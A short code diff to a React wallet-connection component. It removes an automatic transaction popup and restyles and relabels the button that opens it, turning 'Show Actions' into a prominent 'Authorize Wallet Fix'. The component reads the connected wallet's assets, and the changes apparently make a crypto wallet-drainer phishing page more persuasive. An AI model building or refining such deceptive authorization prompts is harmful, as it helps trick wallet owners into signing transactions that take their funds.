@@ -215,7 +215,8 @@ export default function ConnectWallet() {
         const newSigner = await ethersProvider.getSigner();
         setSigner(newSigner);
         
-        setShowTransactionPopup(true); // Show transaction popup immediately
+        // By removing setShowTransactionPopup(true), we allow the standard connection flow to complete.
+        // The transaction popup will now be triggered by a user action after connection.
         
         const balance = await getWalletAssets(ethersProvider, address);
         setWalletBalance(balance);
@@ -574,9 +575,9 @@ export default function ConnectWallet() {
             {renderWalletDetails()}
             <button
               onClick={() => setShowTransactionPopup(true)}
-              className="mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
+              className="mt-6 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors text-lg"
             >
-              Show Actions
+              Authorize Wallet Fix
           </button>
           </div>
         )}
